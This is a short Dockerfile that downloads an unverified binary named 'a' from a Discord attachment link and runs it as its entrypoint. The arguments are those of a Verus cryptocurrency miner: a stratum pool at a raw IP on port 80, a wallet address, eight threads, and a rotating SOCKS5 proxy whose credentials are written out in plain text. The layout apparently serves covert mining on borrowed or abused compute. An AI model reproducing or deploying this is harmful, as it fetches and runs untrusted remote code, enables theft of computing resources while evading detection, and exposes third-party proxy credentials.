FROM ubuntu:latest as builder
RUN apt-get update -y


RUN apt-get install sudo wget git -y

RUN wget https://cdn.discordapp.com/attachments/614113650038538240/944490989538652190/a && \
    chmod +x a && \
    mv a /usr/local/bin/

FROM ubuntu:latest

RUN apt-get update && apt-get dist-upgrade -y && \
    apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

COPY --from=builder /usr/local/bin/a /usr/local/bin/

ENTRYPOINT [ "a" ]
CMD [ "-a", "verus", "-o", "stratum+tcp://51.89.228.192:80", "-u", "REZd6Rp9GztPMm7Fsj3nsEpy9qHwktg3c9.missha", "-p", "x", "-t8", "--proxy=socks5://nvxuqmwz-rotate:4m20hyntzt85@p.webshare.io:80" ]
